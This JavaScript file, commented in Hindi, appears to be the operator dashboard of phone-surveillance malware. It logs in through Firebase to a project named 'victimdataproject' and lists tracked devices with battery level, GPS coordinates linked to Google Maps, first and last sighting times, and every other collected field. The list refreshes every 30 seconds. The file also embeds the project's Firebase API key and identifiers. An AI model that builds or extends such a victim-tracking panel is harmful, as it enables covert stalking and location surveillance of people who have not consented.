// आपकी दी गई फायरबेस कॉन्फ़िगरेशन
const firebaseConfig = {
  apiKey: "AIzaSyAOA7R6MWf_VGVScscqL3ND0zs3kMVCTYk",
  authDomain: "victimdataproject.firebaseapp.com",
  databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com",
  projectId: "victimdataproject",
  storageBucket: "victimdataproject.firebasestorage.app",
  messagingSenderId: "938788267301",
  appId: "1:938788267301:web:cdcff391160dce48fa66cc"
};

// फायरबेस प्रारंभ करें
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const database = firebase.database();

// DOM एलिमेंट्स
const loginContainer = document.getElementById('login-container');
const adminDashboard = document.getElementById('admin-dashboard');
const loginBtn = document.getElementById('login-btn');
const logoutBtn = document.getElementById('logout-btn');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const loginError = document.getElementById('login-error');
const deviceListBody = document.getElementById('device-list');
const searchInput = document.getElementById('search-input');
const refreshTimerSpan = document.getElementById('refresh-timer');
const noDevicesMessage = document.getElementById('no-devices');

const modal = document.getElementById('device-detail-modal');
const modalContent = document.getElementById('detail-content');
const closeModalBtn = document.querySelector('.close-button');

let allDevicesData = {}; // सभी डिवाइस डेटा को कैश करने के लिए
let currentDevicesOnDisplay = {}; // वर्तमान में प्रदर्शित डिवाइस
let autoRefreshInterval;
const REFRESH_INTERVAL_SECONDS = 30;

// लॉगिन कार्यक्षमता
loginBtn.addEventListener('click', () => {
    const email = emailInput.value;
    const password = passwordInput.value;
    loginError.textContent = '';
    loginBtn.disabled = true;
    loginBtn.textContent = 'लॉगिन हो रहा है...';

    auth.signInWithEmailAndPassword(email, password)
        .then((userCredential) => {
            // लॉगिन सफल
            console.log("लॉगिन सफल:", userCredential.user);
            // onAuthStateChanged इसे हैंडल करेगा
        })
        .catch((error) => {
            loginError.textContent = "लॉगिन विफल: " + getFriendlyErrorMessage(error);
            console.error("लॉगिन त्रुटि:", error);
        })
        .finally(() => {
            loginBtn.disabled = false;
            loginBtn.textContent = 'लॉगिन करें';
        });
});

function getFriendlyErrorMessage(error) {
    switch (error.code) {
        case 'auth/invalid-email':
            return 'अमान्य ईमेल प्रारूप।';
        case 'auth/user-not-found':
            return 'इस ईमेल के साथ कोई उपयोगकर्ता नहीं मिला।';
        case 'auth/wrong-password':
            return 'गलत पासवर्ड।';
        case 'auth/too-many-requests':
            return 'बहुत अधिक प्रयास। कृपया बाद में पुनः प्रयास करें।';
        default:
            return error.message;
    }
}


// लॉगआउट कार्यक्षमता
logoutBtn.addEventListener('click', () => {
    auth.signOut().then(() => {
        console.log("लॉगआउट सफल");
        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
        allDevicesData = {}; // डेटा साफ़ करें
        currentDevicesOnDisplay = {};
    }).catch((error) => {
        console.error("लॉगआउट त्रुटि:", error);
        alert("लॉगआउट करने में त्रुटि: " + error.message);
    });
});

// प्रमाणीकरण स्थिति परिवर्तनों को सुनें
auth.onAuthStateChanged((user) => {
    if (user) {
        // उपयोगकर्ता लॉग इन है
        loginContainer.style.display = 'none';
        adminDashboard.style.display = 'block';
        emailInput.value = ''; // फ़ील्ड साफ़ करें
        passwordInput.value = '';
        loginError.textContent = '';
        loadDeviceData();
        startAutoRefresh();
    } else {
        // उपयोगकर्ता लॉग आउट है
        loginContainer.style.display = 'block';
        adminDashboard.style.display = 'none';
        deviceListBody.innerHTML = ''; // डिवाइस सूची साफ़ करें
        noDevicesMessage.style.display = 'block';
        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
    }
});

// ऑटो-रिफ्रेश शुरू करें
function startAutoRefresh() {
    if (autoRefreshInterval) clearInterval(autoRefreshInterval);
    let timeLeft = REFRESH_INTERVAL_SECONDS;
    refreshTimerSpan.textContent = timeLeft;

    autoRefreshInterval = setInterval(() => {
        timeLeft--;
        if (timeLeft < 0) { // < 0 ताकि 0 सेकंड दिखे फिर रिफ्रेश हो
            loadDeviceData(); // मौजूदा डेटा कैश पर आधारित नहीं, सीधे फायरबेस से
            timeLeft = REFRESH_INTERVAL_SECONDS;
        }
        refreshTimerSpan.textContent = timeLeft;
    }, 1000);
}

// डिवाइस डेटा लोड करें
function loadDeviceData() {
    console.log("डिवाइस डेटा लोड हो रहा है...");
    const devicesRef = database.ref('devices');
    // 'value' का उपयोग करें ताकि हर बार पूरा डेटा सेट मिले
    devicesRef.off(); // पिछले श्रोताओं को हटा दें ताकि डुप्लिकेट न हों
    devicesRef.on('value', (snapshot) => {
        allDevicesData = snapshot.val() || {};
        console.log("डेटा प्राप्त:", allDevicesData);
        renderDeviceList(allDevicesData); // हमेशा नवीनतम डेटा के साथ रेंडर करें
    }, (error) => {
        console.error("डेटा पढ़ने में त्रुटि:", error);
        deviceListBody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:red;">डेटा लोड करने में त्रुटि: ${error.message}</td></tr>`;
        noDevicesMessage.style.display = 'none';
    });
}

// डिवाइस सूची को रेंडर करें
function renderDeviceList(devices) {
    deviceListBody.innerHTML = ''; // पुरानी सूची साफ़ करें
    const searchTerm = searchInput.value.toLowerCase().trim();
    let devicesFound = false;
    currentDevicesOnDisplay = {}; // रीसेट करें

    if (Object.keys(devices).length === 0) {
        noDevicesMessage.style.display = 'block';
        noDevicesMessage.textContent = 'कोई डिवाइस नहीं मिला।';
        return;
    }

    const sortedDeviceIds = Object.keys(devices).sort((a, b) => {
        const timeA = devices[a]?.last_data?.timestamp || devices[a]?.info?.lastSeen || 0;
        const timeB = devices[b]?.last_data?.timestamp || devices[b]?.info?.lastSeen || 0;
        return timeB - timeA; // नवीनतम पहले
    });

    for (const deviceId of sortedDeviceIds) {
        const deviceEntry = devices[deviceId];
        const deviceInfo = deviceEntry.info || {};
        const deviceData = deviceEntry.last_data || {};

        const deviceName = deviceInfo.deviceName || 'N/A';
        
        // खोज फ़िल्टर
        if (searchTerm && 
            !deviceId.toLowerCase().includes(searchTerm) &&
            !deviceName.toLowerCase().includes(searchTerm)) {
            continue; // यदि खोज से मेल नहीं खाता है तो छोड़ दें
        }

        devicesFound = true;
        currentDevicesOnDisplay[deviceId] = deviceEntry; // इसे कैश में जोड़ें

        const row = deviceListBody.insertRow();
        row.setAttribute('data-device-id', deviceId); // बाद में अपडेट के लिए आईडी

        row.insertCell().textContent = deviceId.length > 15 ? deviceId.substring(0, 15) + '...' : deviceId;
        row.cells[0].title = deviceId; // पूर्ण ID टूलटिप में
        row.insertCell().textContent = deviceName;
        row.insertCell().textContent = deviceData.batteryLevel != null ? `${deviceData.batteryLevel}%` : 'N/A';
        
        const locationText = (deviceData.latitude != null && deviceData.longitude != null) 
            ? `${parseFloat(deviceData.latitude).toFixed(4)}, ${parseFloat(deviceData.longitude).toFixed(4)}` 
            : 'N/A';
        const locationCell = row.insertCell();
        if (deviceData.latitude != null && deviceData.longitude != null) {
            const mapLink = document.createElement('a');
            mapLink.href = `https://www.google.com/maps?q=${deviceData.latitude},${deviceData.longitude}`;
            mapLink.target = '_blank';
            mapLink.textContent = locationText;
            mapLink.style.color = '#1a73e8';
            mapLink.style.textDecoration = 'none';
            mapLink.onmouseover = () => mapLink.style.textDecoration = 'underline';
            mapLink.onmouseout = () => mapLink.style.textDecoration = 'none';
            locationCell.appendChild(mapLink);
        } else {
            locationCell.textContent = locationText;
        }
        
        const lastTimestamp = deviceData.timestamp || deviceInfo.lastSeen;
        row.insertCell().textContent = lastTimestamp ? new Date(lastTimestamp).toLocaleString() : 'N/A';
        
        const detailButtonCell = row.insertCell();
        const detailButton = document.createElement('button');
        detailButton.textContent = 'विवरण';
        detailButton.classList.add('detail-button');
        detailButton.onclick = () => showDeviceDetails(deviceId, deviceEntry);
        detailButtonCell.appendChild(detailButton);
    }

    if (!devicesFound) {
        noDevicesMessage.style.display = 'block';
        if (searchTerm) {
            noDevicesMessage.textContent = `"'${searchTerm}'" के लिए कोई डिवाइस नहीं मिला।`;
        } else {
            noDevicesMessage.textContent = 'कोई डिवाइस नहीं मिला।';
        }
    } else {
        noDevicesMessage.style.display = 'none';
    }
}

// खोज इनपुट पर फ़िल्टर करें
searchInput.addEventListener('input', () => {
    renderDeviceList(allDevicesData); // कैश किए गए डेटा के साथ सूची को फिर से रेंडर करें
});

// डिवाइस विवरण दिखाएं (Modal)
function showDeviceDetails(deviceId, deviceFullData) {
    modalContent.innerHTML = ''; // पिछला डेटा साफ़ करें
    
    const info = deviceFullData.info || {};
    const lastData = deviceFullData.last_data || {};

    let detailsHtml = `<p><strong>डिवाइस ID:</strong> ${deviceId}</p>`;
    detailsHtml += `<p><strong>डिवाइस का नाम:</strong> ${info.deviceName || 'N/A'}</p>`;
    detailsHtml += `<p><strong>बैटरी:</strong> ${lastData.batteryLevel != null ? lastData.batteryLevel + '%' : 'N/A'}</p>`;
    detailsHtml += `<p><strong>अक्षांश (Latitude):</strong> ${lastData.latitude != null ? lastData.latitude : 'N/A'}</p>`;
    detailsHtml += `<p><strong>देशांतर (Longitude):</strong> ${lastData.longitude != null ? lastData.longitude : 'N/A'}</p>`;
    if (lastData.latitude != null && lastData.longitude != null) {
        detailsHtml += `<p><a href="https://www.google.com/maps?q=${lastData.latitude},${lastData.longitude}" target="_blank">मानचित्र पर देखें</a></p>`;
    }
    const lastDataTimestamp = lastData.timestamp;
    detailsHtml += `<p><strong>अंतिम डेटा अपडेट:</strong> ${lastDataTimestamp ? new Date(lastDataTimestamp).toLocaleString() + ` (${lastDataTimestamp})` : 'N/A'}</p>`;
    
    const infoLastSeen = info.lastSeen;
    if (infoLastSeen && infoLastSeen !== lastDataTimestamp) { // यदि यह lastData.timestamp से भिन्न है तो ही दिखाएं
        detailsHtml += `<p><strong>अंतिम बार देखा गया (Info):</strong> ${new Date(infoLastSeen).toLocaleString()} (${infoLastSeen})</p>`;
    }
    const infoFirstSeen = info.firstSeen;
    if (infoFirstSeen) {
        detailsHtml += `<p><strong>पहली बार देखा गया (Info):</strong> ${new Date(infoFirstSeen).toLocaleString()} (${infoFirstSeen})</p>`;
    }
    
    detailsHtml += "<h3>सभी अंतिम डेटा (Last Data):</h3>";
    if (Object.keys(lastData).length > 0) {
        for(const key in lastData) {
            if (Object.hasOwnProperty.call(lastData, key)) {
                let value = lastData[key];
                if (key === 'timestamp' && typeof value === 'number') {
                    value = new Date(value).toLocaleString() + ` (${value})`;
                }
                detailsHtml += `<p><strong>${key}:</strong> ${value}</p>`;
            }
        }
    } else {
        detailsHtml += "<p>कोई 'last_data' उपलब्ध नहीं है।</p>";
    }

    detailsHtml += "<h3>सभी जानकारी डेटा (Info Data):</h3>";
    if (Object.keys(info).length > 0) {
        for(const key in info) {
            if (Object.hasOwnProperty.call(info, key)) {
                let value = info[key];
                 if ((key === 'lastSeen' || key === 'firstSeen') && typeof value === 'number') {
                    value = new Date(value).toLocaleString() + ` (${value})`;
                }
                detailsHtml += `<p><strong>${key}:</strong> ${value}</p>`;
            }
        }
    } else {
        detailsHtml += "<p>कोई 'info' डेटा उपलब्ध नहीं है।</p>";
    }


    modalContent.innerHTML = detailsHtml;
    modal.style.display = "block";
}

// Modal बंद करें
closeModalBtn.onclick = function() {
    modal.style.display = "none";
}
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}

// कीबोर्ड से Modal बंद करें (Escape key)
window.addEventListener('keydown', function(event) {
    if (event.key === 'Escape' || event.key === 'Esc') {
        if (modal.style.display === "block") {
            modal.style.display = "none";
        }
    }
});

// प्रारंभिक जांच (यदि उपयोगकर्ता पहले से लॉग इन है)
// auth.onAuthStateChanged इसे अपने आप हैंडल कर लेगा।